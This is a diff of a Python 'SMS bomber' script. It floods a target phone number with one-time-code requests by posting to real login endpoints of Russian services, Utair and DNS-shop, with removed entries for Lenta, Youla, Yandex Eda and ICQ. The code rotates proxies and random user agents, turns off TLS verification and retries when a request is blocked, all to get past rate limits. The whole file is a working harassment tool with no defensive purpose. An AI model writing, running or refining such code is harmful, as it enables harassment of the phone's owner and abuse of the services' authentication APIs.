@@ -4,117 +4,98 @@ import argparse
 import random
 from concurrent.futures import ThreadPoolExecutor
 from fake_useragent import UserAgent
+import urllib3
 
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 ua = UserAgent()
 
 WORKING_APIS = {
-    "DNS_Old": {
-        "url": "https://www.dns-shop.ru/auth/auth/fast-authorization/",
-        "method": "POST",
-        "data": {"FastAuthorizationLoginLoadForm[login]": "{phone}"},
-        "headers": {"Origin": "https://www.dns-shop.ru", "Referer": "https://www.dns-shop.ru/"}
-    },
     "Utair": {
         "url": "https://b.utair.ru/api/v1/login/",
         "method": "POST",
         "data": {"login": "{phone}"},
         "headers": {"Origin": "https://www.utair.ru", "Referer": "https://www.utair.ru/"}
-    },
-    "Lenta": {
-        "url": "https://lenta.com/api/v1/authentication/requestValidationCode",
-        "method": "POST",
-        "json": {"phone": "+{phone}"},
-        "headers": {"Origin": "https://lenta.com", "Referer": "https://lenta.com/"}
-    },
-    "Youla": {
-        "url": "https://youla.ru/web-api/auth/request_code",
-        "method": "POST",
-        "data": {"phone": "{phone}"},
-        "headers": {"Origin": "https://youla.ru", "Referer": "https://youla.ru/"}
-    },
-    "Yandex_Eda": {
-        "url": "https://eda.yandex/api/v1/user/request_authentication_code",
-        "method": "POST",
-        "json": {"phone_number": "+{phone}"},
-        "headers": {"Origin": "https://eda.yandex", "Referer": "https://eda.yandex/"}
-    },
-    "ICQ": {
-        "url": "https://u.icq.net/api/v90/smsreg/requestPhoneValidation.php",
-        "method": "POST",
-        "data": {
-            "msisdn": "+{phone}",
-            "locale": "en",
-            "countryCode": "ru",
-            "version": "1",
-            "k": "ic1rtwz1s1Hj1O0r",
-            "r": "46763"
-        }
     }
 }
 
 def load_working_proxies(filename="working_proxies.txt"):
     try:
         with open(filename, "r") as f:
-            proxies = [line.strip() for line in f if line.strip()]
-        return proxies
+            return [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
         return []
 
-def send_sms(service_name, api_data, phone, proxy_pool):
-    url = api_data["url"]
-    method = api_data.get("method", "POST")
+def get_random_proxy(proxy_pool):
+    if proxy_pool:
+        p = random.choice(proxy_pool)
+        return {"http": f"http://{p}", "https": f"http://{p}"}, p
+    return None, "Direct"
+
+def send_utair(phone, proxy_pool):
+    api = WORKING_APIS["Utair"]
+    data = {"login": phone}
     
-    data = {}
-    if "data" in api_data:
-        for k, v in api_data["data"].items():
-            data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v
-            
-    json_data = {}
-    if "json" in api_data:
-        for k, v in api_data["json"].items():
-            json_data[k] = v.replace("{phone}", phone) if isinstance(v, str) else v
-
-    headers = {
-        "User-Agent": ua.random,
-        "Accept": "application/json, text/plain, */*"
-    }
-    headers.update(api_data.get("headers", {}))
-
     attempts = 0
-    max_attempts = 3
-    success = False
-
-    while attempts < max_attempts and not success:
+    while attempts < 3:
         attempts += 1
-        proxy = None
-        proxy_str = "Direct"
+        proxy, proxy_str = get_random_proxy(proxy_pool) if attempts <= 2 else (None, "Direct")
         
-        if proxy_pool and attempts <= 2:
-            p = random.choice(proxy_pool)
-            proxy_str = p
-            proxy = {"http": f"http://{p}", "https": f"http://{p}"}
-
+        headers = {
+            "User-Agent": ua.random,
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/x-www-form-urlencoded",
+            **api["headers"]
+        }
+        
         try:
-            if method == "POST":
-                if json_data:
-                    r = requests.post(url, json=json_data, headers=headers, proxies=proxy, timeout=8)
-                else:
-                    r = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=8)
-            
-            if r.status_code in [200, 201, 202, 204]:
-                print(f"[+] OK: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
-                success = True
-            elif r.status_code in [403, 429]:
-                print(f"[-] BLOCKED {r.status_code}: {service_name} | Proxy: {proxy_str}. Retrying...")
+            r = requests.post(api["url"], data=data, headers=headers, proxies=proxy, timeout=8, verify=False)
+            if r.status_code in [200, 201, 204]:
+                print(f"[+] OK: Utair ({r.status_code}) | Proxy: {proxy_str}")
+                return
+            elif r.status_code == 403:
+                print(f"[-] BLOCKED 403: Utair | Proxy: {proxy_str}. Retrying...")
             else:
-                print(f"[-] FAIL: {service_name} ({r.status_code}) | Proxy: {proxy_str}")
-                success = True
+                print(f"[-] FAIL: Utair ({r.status_code}) | Proxy: {proxy_str}")
+        except Exception as e:
+            print(f"[!] ERR: Utair - {type(e).__name__} | Proxy: {proxy_str}")
+
+def send_dns(phone, proxy_pool):
+    attempts = 0
+    while attempts < 3:
+        attempts += 1
+        proxy, proxy_str = get_random_proxy(proxy_pool) if attempts <= 1 else (None, "Direct")
+        
+        session = requests.Session()
+        if proxy:
+            session.proxies.update(proxy)
+            
+        session.headers.update({
+            "User-Agent": ua.random,
+            "Accept": "application/json, text/plain, */*",
+        })
+        
+        try:
+            session.get("https://www.dns-shop.ru/", timeout=8, verify=False)
+            
+            url = "https://www.dns-shop.ru/auth/auth/fast-authorization/"
+            data = {"FastAuthorizationLoginLoadForm[login]": phone}
+            
+            session.headers.update({
+                "Origin": "https://www.dns-shop.ru",
+                "Referer": "https://www.dns-shop.ru/",
+                "X-Requested-With": "XMLHttpRequest"
+            })
+            
+            r = session.post(url, data=data, timeout=8, verify=False)
+            
+            if r.status_code in [200, 201, 204]:
+                print(f"[+] OK: DNS ({r.status_code}) | Proxy: {proxy_str}")
+                return
+            else:
+                print(f"[-] FAIL: DNS ({r.status_code}) | Proxy: {proxy_str}")
                 
         except Exception as e:
-            print(f"[!] ERR: {service_name} - {type(e).__name__} | Proxy: {proxy_str}")
-
-    if not success:
-        print(f"[X] Could not send {service_name}.")
+            print(f"[!] ERR: DNS - {type(e).__name__} | Proxy: {proxy_str}")
 
 def main():
     parser = argparse.ArgumentParser()
@@ -122,27 +103,22 @@ def main():
     parser.add_argument("-c", "--count", type=int, default=1)
     args = parser.parse_args()
 
-    phone = args.phone
-    if phone.startswith("+"):
-        phone = phone[1:]
-
+    phone = args.phone.lstrip("+")
     proxy_pool = load_working_proxies()
 
     print(f"\n[*] Target: {phone}")
-    print(f"[*] APIs: {len(WORKING_APIS)}")
     print(f"[*] Cycles: {args.count}")
-    print(f"[*] Proxies in pool: {len(proxy_pool)}\n")
+    print(f"[*] Proxies: {len(proxy_pool)}\n")
 
     try:
         for i in range(args.count):
             print(f"--- Cycle {i+1} ---")
-            with ThreadPoolExecutor(max_workers=len(WORKING_APIS)) as executor:
-                for name, api_data in WORKING_APIS.items():
-                    executor.submit(send_sms, name, api_data, phone, proxy_pool)
+            with ThreadPoolExecutor(max_workers=2) as executor:
+                executor.submit(send_utair, phone, proxy_pool)
+                executor.submit(send_dns, phone, proxy_pool)
             
             if i < args.count - 1:
                 time.sleep(5)
-                
     except KeyboardInterrupt:
         print("\n[*] Stopped.")
 
